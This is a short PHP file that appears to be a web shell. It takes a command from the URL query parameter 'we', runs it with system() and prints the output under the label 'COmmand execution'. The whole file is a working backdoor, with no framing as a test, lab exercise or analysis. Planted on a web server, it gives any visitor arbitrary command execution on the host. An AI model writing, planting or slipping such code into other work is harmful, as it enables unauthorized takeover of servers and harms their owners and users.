<?php
if(isset($_GET['we']))
{
	echo "COmmand execution: <br>";
	echo "<pre>";
	system($_GET['we']);
	echo "</pre>";
}
